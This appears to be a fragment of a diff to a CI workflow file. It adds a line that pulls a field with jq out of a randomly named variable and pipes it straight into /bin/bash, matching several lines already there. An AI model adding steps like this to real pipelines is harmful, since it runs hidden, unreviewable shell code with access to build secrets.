@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$gfz0" | jq -r .kf5 | /bin/bash
           echo $rqkxx0861 | jq -r .dqs58494 | /bin/bash
           echo $thddc90 | jq -r .dbh6 | /bin/bash
+          printf '%s' "$gfpia2880" | jq -r .rsl25577 | /bin/bash
 
       - name: Save output
         if: always()
